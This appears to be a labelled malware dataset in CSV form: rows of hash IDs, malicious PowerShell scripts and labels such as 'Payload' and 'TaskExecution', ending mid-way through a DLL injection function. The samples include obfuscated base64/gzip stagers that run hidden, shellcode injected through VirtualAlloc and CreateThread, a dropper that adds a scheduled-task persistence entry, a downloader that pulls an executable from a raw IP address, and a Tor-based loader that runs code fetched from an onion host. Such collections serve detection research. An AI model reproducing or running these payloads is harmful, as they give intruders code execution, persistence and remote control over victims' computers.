if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAL4MgFgCA71WbW/aSBD+nEr9D1aFhK0SbF6aNJEq3RpjXgIJxMEEOFQt9tosLF5qr5OYXv/7jcFu6LU55e6ks0De3XnZ2Wee2bEXB46gPJCSq81ZUzP7Penr2zcnAxzijSQXVl67JBU2VO/ddxfthXJyAsLCY0I/7+goIdInSZ6h7dbgG0yD+eVlIw5DEojDvNwiAkUR2SwYJZGsSH9I4yUJyenNYkUcIX2VCp/LLcYXmGVqSQM7SyKdosBNZT3u4DS4srVlVMjF338vKrPTyrzc/BJjFslFK4kE2ZRdxoqK9E1JN7xLtkQu9qkT8oh7ojymQa1aHgUR9sg1eHsgfSKW3I2KChwFfiERcRhIz4dKvRx05CIMByF3kOuGJAKTcid44GsiF4KYsZL0mzzLQriNA0E3BOSChHxrkfCBOiQqt3HgMnJLvLl8TR7zk7/WSD42Aq2BCJUSpOWlWPvcjRk5mBeVn6NN86nA80NOAYdvb9+8fePlVKAt97w6qR8TAUYns/2YQKjygEd0r/pJ0kpSH/bDgocJTAt3YUyUuTRL8zCbz6UCZlZ1vVknWtcoveymktuAxTq+iMyIfIblmc2pOwezLFkFn9bw6IbXbmteKn6ZewbxaECMJMAb6uT0kn+VBOIxsj94OVe7hvjkYiYgrkEY8bFIES1Js5/NmhsqvtvqMWUuCZEDiYwgKsix8mMwhyTJxU7QJxtA7TAvQk48IDXJtTMiJ/nu6RyUig2Go6gkDWKoKqckWQQz4pYkFEQ0E6FY8P2w+BxuP2aCOjgSubu58hc4s20bPIhEGDuQT4DgztoSh2KWIlKS2tQlemJRP9+++Es8GpgxGvjg6QHyASspDpZIWRJCpMeMUMoWEZ3NlpENqO6L3WTYh9LOamPPLuwTt/hCvDn7D1RPAcqROYoWsm4xLkqSTUMBV0cKds6y/xTQ0f1xHFojJFnG5Ly6Znoi0oIohGiXMjeDbQ9SKAAgM+QbHUfkrG6JEOCT36k3tIHgmXQC1nf0Na2gR1rp9OE/orUON87dq+6qrYbG09JDnajTbw+MYbtdf+hadl1YzY64GnREv3m/WlmofTuaiGkHte+otp7Ud9su3Vk95E6e1LOdvnvU9Kfdyne9ieF5/rln3VY+mLQ3bgx1rYp7RjPujfVHXatHTfrYHtLRcN01xWJiMzzyVP++coHpUy9c2RXe33UQai1rzq7r2a1l300mbfViXF+jJkKNoGmbOr+a6CEaqDb2bT6uJw9nY7+BdNOhZDocmfpwaOpo1Fp9MS5UH2zv8VIf21U63d7fLmFuQghXqlbvuGTHJ0MAqcUR9m9Bx29UnaUHOsZ7pL+/5lEVr3WOdNAxp18grsnWHDCQ342qHNns+h6j3jQxVbUyGdRRW6Pjlo9Sl9jXhxhFD8bOUCu2y93xh+uJp9r37Fw1Gndbx1NV9bFtXDnTytPHm/OPvTG1NxyNVNV+l7ID6FHAbW86DBdHKX/p1u/jMFpiBlSAmzwvU5OHZnYvDzhNLWT5uVWvSRgQBv0NOmDObcQYd9IukV/j0KQOrWMO1TqCYa36y5EifVdUnntHvnR5OYVooViAv+UeCXyxLGlPNU2DBqA91TU47+sP2ODbRE49ldL+kWOUOWd750paNIVttKho/wN2WcEu4eW+Arvntb+RvgpPrfT99D9Jflz4RwD/OxTGmApQt+D2YeTQJV8EI+PM0UfGPlfACS970u+9m1icXsPHx5/2cg3LZwoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

",Payload
a78aed4ca69ffb472833da4d9acbfe057030f1a49dbdfaaebf71e431889ff17b,"
$path= ""$env:userprofile\appdata\local\microsoft\Windows""

if(-not(Test-Path -Path($path)))
{mkdir $path}

$fileout=""$path\L69742.vbs"";

$encstrvbs=""c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K"";

$bytevbs=[System.Convert]::FromBase64String($encstrvbs);

$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);

$strvbs = $strvbs.replace('

set-content $fileout $strvbs;

$tmpfile=""$env:TEMP\U1848931.TMP"";



$pscode_b64  =get-content $tmpfile | out-string;

$pscode_b64=$pscode_b64.trim();


$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))

$id = [string](get-random -min 10000 -max 100000)

$pscode = $pscode.replace('

set-content ""$path\mc.ps1"" $pscode


$taskstr=""schtasks /create /F /sc minute /mo 2 /tn """"GoogleServiceUpdate"""" /tr """"\""""$fileout""""\""""   "";



iex 'cmd /c $taskstr';

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
8d9d5c5482645d5b908d130c9841cd888bc49b5e8d1f603c5670e7488338c73d,"
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAPFRalcCA71WbY/aRhD+fJHyH6wIybZKeD+SnBSpNhgwhznA2BwQVO3Za3th/RJ7zQFp/nvHgHOkuWvTVqqFxe7Oy84+88yOnTSwGAkDzlHq5oyOwxr35fWrqxGKkc8JBWvRbCwO7zW9yBV2s+ag3lB34tUVaBQ+70md+8gJSymK2qGPSLC6uWmlcYwDdpqXuphJSYL9B0pwIojc79zMwzF+e/ewxhbjvnCF30pdGj4gelbbt5DlYe6tFNiZbBBaKAuupEeUMIH/9IkXl2+rq5LyOUU0EXh9nzDsl2xKeZH7KmYbTvcRFniNWHGYhA4rzUhQr5WMIEEOHoK3LdYw80I74UU4BfxizNI44I7nyRycxAIPw1EcWpJtxzgB7ZIabMMNFgpBSmmR+1VYnnefpAEjPgY5w3EY6TjeEgsnpR4KbIon2FkJQ/yYH/pnjYRLI9AasVgsQkaeCVML7ZTikyUv/hjoUxZFeC4zCRB8ff3q9SsnZ4GrIuWSADC6Wh7HGOIURmFCjnofuUqR02BHxMJ4D9PCNE6xuOKWGf7L1YorpD3LiCfrW1p82Uk1twB9uln0G5S2YHlphsRegdk5RYWDMt6mv7GphKaZ+GXGtbFDAtzeB8gnVk4q4Tn8sUPx8cylXG0I8Qn8WYDtNqbYRSxDtMgtfzRTfMK+2copoTaOJQtymEBUkF7x+2BOSRJ4NdCwD5id5jxkwwEq41z7TN99vns2ByW+RVGSFLlRCrVkFTkdI4rtIicFCTmLpJSFxyH/FK6WUkYslLDc3Ur8E5znbVthkLA4tSCbAMFUj7BFEM0QKXI9YmN5rxM3355/Fo8WopQELnjaQj5gJcNBZxlHYoj0iQ9iScdM9SOKfVA8FniHIhfK+VwUR2YhF9v8C9Hm3D8RPYMnx+UiVsi5TkNW5EwSM7guMqhzjv2HcC5ujMvAWjE+Z0vIi2op71lWCgWXJBlrz5AdAYoZgNOJQ19GCW42dBYDdMKb8h1pSfDM1YBqlrwhVemRVFUNXoPU1bD9zr7tr3vluL3zHElNVK03ao97vca2r5sNpisqux2pTFPu12td6k2MOVuoUm9KKpt54xD1yUEfSPZ8V24e5MNjRd4d1q7tzNuO475z9En1ukMGs9ZYrtTQoK2kg5n8KFcaiUIee2NijDf9DnuYmxQZTtm9r35AZDeI12Y1fPDNitT16mh2HZldT7P38175g7GrVYdTA17UjmYYOeWqCWMX1mqepYwlqXmbZMfdjoPh/KEjO1qXjYy63bRq0QDT6A516cSuLeaLdv96ogwdvd6vDaZSfTxzJaPr3ZNFuVv+MOvv6DCU2gPX62T72VPTX8em3ngHshlyIwep0kGSWv1GN1SMbuiYvledRE2wNY/xmb7LZM/L9DuPPUOd1u8XTSWE0OTP464rKTBC8I4leYo6ZGP8cl+uLmCvRhCYNVdSQWZUF6ESoX5jWzY9S64cGklPsu7A3z2daUOn2XPK5fL73d1UTbXpvDFYK/Av7aTB9pGhPsQpTwGzj28ylgHNCv6Cmua6fk0vyPNS29BQnHiIAqmgH+TF3gnjzvliH4UksxCEpza/wXGAKfRG6J55jUiUhlbWZo59AFrcqfGsoOANGNZrz45E7pui+NR+8qWbmwWEChUHZVAa4MBlXrGyq1cq0EEqu0YFjvvzp2uF0V7IPBWzBvQE0dk9PboXs+orWLWaRfqbAasl6f+A4PkC8ODP/jsEn9b+QvpTqFaKFxj8IPt+4R8B/e9AmCHCQF2Hy4ziU8N9HoszcS4+Vi7TBfxwzk/20XiXsrdD+Jb5A3AgamOsCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

",Payload
1e5b430c72c32ae100fdf5f368001d04c0e54e4b026fe992ca4635e461254c32,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x80,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
9dbdb5ec7578133a54cd015eb6f4099abd7f5e9bcab2ffb87fc26b5372445f0b,"
'LXUnfqn';$ErrorActionPreference = 'SilentlyContinue';'Jlnl';'rXrPGggb';$by = (get-wmiobject Win32_ComputerSystemProduct).UUID;'kjEvisMr';'BlwFKzHgx';if ((gp HKCU:\\Software\Microsoft\Windows\CurrentVersion\Run) -match $by){;'BrOZYLFVY';'ihznknftcRL';(Get-Process -id $pid).Kill();'eMBnBWC';'ClMCvnGz';};'kFqbERjcaK';'cZdefv';function e($ohd){;'drSzUSrd';'JvFd';$mtk = (((iex ""nslookup -querytype=txt $ohd 8.8.8.8"") -match '""') -replace '""', '')[0].Trim();'wHpWIPZ';'rZOmyT';$ilua.DownloadFile($mtk, $bqvt);'KqrPY';'tCgMs';$ws = $xyu.NameSpace($bqvt).Items();'DVRZCMXn';'aVMuAymCDo';$xyu.NameSpace($ezpr).CopyHere($ws, 20);'NoYaTMgWV';'WczlafFHI';rd $bqvt;'AJc';'Rl';};'mwPV';'XYS';'bSRkM';'GFeZKeMy';'Vt';'blWvxEYdB';$ezpr = $env:APPDATA + '\' + $by;'HTC';'zgOw';if (!(Test-Path $ezpr)){;'fAXKjau';'kEXx';$vpjq = New-Item -ItemType Directory -Force -Path $ezpr;'GWSbA';'vOvra';$vpjq.Attributes = ""Hidden"", ""System"", ""NotContentIndexed"";'amPCGy';'EKFM';};'sB';'RRiIYz';'bvcCeTeLW';'NcOTYolCIB';$vtzg=$ezpr+ '\tor.exe';'RoqsuXE';'fQGBWGwt';$ot=$ezpr+ '\polipo.exe';'HXKsRivf';'oynNceOnFxy';$bqvt=$ezpr+'\'+$by+'.zip';'DJlrBBZS';'HlBZ';$ilua=New-Object System.Net.WebClient;'QDcpy';'QJxf';$xyu=New-Object -C Shell.Application;'xeSu';'BEJbU';'BtnJKUSm';'HuG';if (!(Test-Path $vtzg) -or !(Test-Path $ot)){;'cxjBOmZvDk';'NInn';e 'i.vankin.de';'COYVXPD';'QLikWodWT';};'nlHScK';'tLVWu';'DGZInswj';'ieaqBnXXBL';if (!(Test-Path $vtzg) -or !(Test-Path $ot)){;'Tga';'rUFQi';e 'gg.ibiz.cc';'LVSqds';'MkiSQLVJy';};'sFUMwRQj';'DZ';'db';'NmVXjZaO';$cvdz=$ezpr+'\roaminglog';'LUPq';'gKQgLmYh';saps $vtzg -Ar "" --Log `""notice file $cvdz`"""" -wi Hidden;'PZxnCI';'soSyFSxz';do{sleep 1;$bimy=gc $cvdz}while(!($bimy -match 'Bootstrapped 100%: Done.'));'MDNhoZxE';'GuMuzoCwT';saps $ot -a ""socksParentProxy=localhost:9050"" -wi Hidden;'cfrwPc';'DlnzyvwBYQ';sleep 7;'TAtSCy';'NgTi';$qdax=New-Object System.Net.WebProxy(""localhost:8123"");'Axpk';'yYePww';$qdax.useDefaultCredentials = $true;'KcqLHXXNxQs';'mBUkNfwsfiX';$ilua.proxy=$qdax;'NnVlUajch';'tgizAGRCEXq';$pbtx='http://powerwormjqj42hu.onion/get.php?s=setup&mom=0776B201-51DE-11CB-A78C-9C1F26D75FB9&uid=' + $by;'zl';'rIIvBbyFn';while(!$nrcb){$nrcb=$ilua.downloadString($pbtx)};'VWM';'UAqS';if ($nrcb -ne 'none'){;'yyeYfmxpss';'eT';iex $nrcb;'oD';'JqEesDpgbI';};'YsGjzbNbhIw';

",TaskExecution
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
c81af1e691842e25295c13275d6f517e4eb75f08416593473d5e4e536e073896,"
$nmop = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $nmop -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbd,0xb6,0x26,0x55,0x6a,0xd9,0xc3,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x31,0x68,0x13,0x83,0xc0,0x04,0x03,0x68,0xb9,0xc4,0xa0,0x96,0x2d,0x8a,0x4b,0x67,0xad,0xeb,0xc2,0x82,0x9c,0x2b,0xb0,0xc7,0x8e,0x9b,0xb2,0x8a,0x22,0x57,0x96,0x3e,0xb1,0x15,0x3f,0x30,0x72,0x93,0x19,0x7f,0x83,0x88,0x5a,0x1e,0x07,0xd3,0x8e,0xc0,0x36,0x1c,0xc3,0x01,0x7f,0x41,0x2e,0x53,0x28,0x0d,0x9d,0x44,0x5d,0x5b,0x1e,0xee,0x2d,0x4d,0x26,0x13,0xe5,0x6c,0x07,0x82,0x7e,0x37,0x87,0x24,0x53,0x43,0x8e,0x3e,0xb0,0x6e,0x58,0xb4,0x02,0x04,0x5b,0x1c,0x5b,0xe5,0xf0,0x61,0x54,0x14,0x08,0xa5,0x52,0xc7,0x7f,0xdf,0xa1,0x7a,0x78,0x24,0xd8,0xa0,0x0d,0xbf,0x7a,0x22,0xb5,0x1b,0x7b,0xe7,0x20,0xef,0x77,0x4c,0x26,0xb7,0x9b,0x53,0xeb,0xc3,0xa7,0xd8,0x0a,0x04,0x2e,0x9a,0x28,0x80,0x6b,0x78,0x50,0x91,0xd1,0x2f,0x6d,0xc1,0xba,0x90,0xcb,0x89,0x56,0xc4,0x61,0xd0,0x3e,0x29,0x48,0xeb,0xbe,0x25,0xdb,0x98,0x8c,0xea,0x77,0x37,0xbc,0x63,0x5e,0xc0,0xc3,0x59,0x26,0x5e,0x3a,0x62,0x57,0x76,0xf8,0x36,0x07,0xe0,0x29,0x37,0xcc,0xf0,0xd6,0xe2,0x79,0xf4,0x40,0xcd,0xd6,0xf7,0x94,0xa5,0x24,0xf8,0x8b,0xa5,0xa0,0x1e,0xe3,0x95,0xe2,0x8e,0x43,0x46,0x43,0x7f,0x2b,0x8c,0x4c,0xa0,0x4b,0xaf,0x86,0xc9,0xe1,0x40,0x7f,0xa1,0x9d,0xf9,0xda,0x39,0x3c,0x05,0xf1,0x47,0x7e,0x8d,0xf6,0xb8,0x30,0x66,0x72,0xab,0xa4,0x86,0xc9,0x91,0x62,0x98,0xe7,0xbc,0x8a,0x0c,0x0c,0x17,0xdd,0xb8,0x0e,0x4e,0x29,0x67,0xf0,0xa5,0x22,0xae,0x64,0x06,0x5c,0xcf,0x68,0x86,0x9c,0x99,0xe2,0x86,0xf4,0x7d,0x57,0xd5,0xe1,0x81,0x42,0x49,0xba,0x17,0x6d,0x38,0x6f,0xbf,0x05,0xc6,0x56,0xf7,0x89,0x39,0xbd,0x09,0xf5,0xef,0xfb,0x7f,0x17,0x2c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$kzt=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($kzt.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$kzt,0,0,0);for (;;){Start-sleep 60};

",Payload
32973e5563f191ccc36cbb50afe46f6f206d2eb36078a44092320fe499026cbc,"
$hZX = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $hZX -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5e,0x3d,0x41,0x02,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$PZzG=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($PZzG.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$PZzG,0,0,0);for (;;){Start-sleep 60};

",Payload
5672d0769231320240469eeb0b6812e2fdb93b10ae6d49a359c80d40a7291b7a,"function Invoke-DllInjection
{


    Param (
        [Parameter( Position = 0, Mandatory = $True )]
        [Int]
        $ProcessID,

        [Parameter( Position = 1, Mandatory = $True )]
        [String]
        $Dll
    )

    
    try
    {
        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
    }
    catch [System.Management.Automation.ActionPreferenceStopException]
    {
        Throw ""Process does not exist!""
    }
    
    
    try
    {
        $Dll = (Resolve-Path $Dll -ErrorAction Stop).Path
        Write-Verbose ""Full path to Dll: $Dll""
        $AsciiEncoder = New-Object System.Text.ASCIIEncoding
        
        $DllByteArray = $AsciiEncoder.GetBytes($Dll)
    }
    catch [System.Management.Automation.ActionPreferenceStopException]
    {
        Throw ""Invalid Dll path!""
    }

    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    function Local:Get-PEArchitecture
    {
        Param
        (
            [Parameter( Position = 0,
                        Mandatory = $True )]
            [String]
            $Path
        )
    
        
        $FileStream = New-Object System.IO.FileStream($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
    
        [Byte[]] $MZHeader = New-Object Byte[](2)
        $FileStream.Read($MZHeader,0,2) | Out-Null
    
        $Header = [System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)
        if ($Header -ne 'MZ')
        {
            $FileStream.Close()
            Throw 'Invalid PE header.'
        }
    
        
        $FileStream.Seek(0x3c, [System.IO.SeekOrigin]::Begin) | Out-Null
    
        [Byte[]] $lfanew = New-Object Byte[](4)
    
        
        $FileStream.Read($lfanew,0,4) | Out-Null
        $PEOffset = [Int] ('0x{0}' -f (( $lfanew[-1..-4] | % { $_.ToString('X2') } ) -join ''))
    
        
        $FileStream.Seek($PEOffset + 4, [System.IO.SeekOrigin]::Begin) | Out-Null
        [Byte[]] $IMAGE_FILE_MACHINE = New-Object Byte[](2)
    
        
        $FileStream.Read($IMAGE_FILE_MACHINE,0,2) | Out-Null
        $Architecture = '{0}' -f (( $IMAGE_FILE_MACHINE[-1..-2] | % { $_.ToString('X2') } ) -join '')
        $FileStream.Close()
    
        if (($Architecture -ne '014C') -and ($Architecture -ne '8664'))
        {
            Throw 'Invalid PE header or unsupported architecture.'
        }
    
        if ($Architecture -eq '014C')
        {
            Write-Output 'X86'
        }
        elseif ($Architecture -eq '8664')
        {
            Write-Output 'X64'
        }
        else
        {
            Write-Output 'OTHER'
        }
    }

    
    
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
    $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
    $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
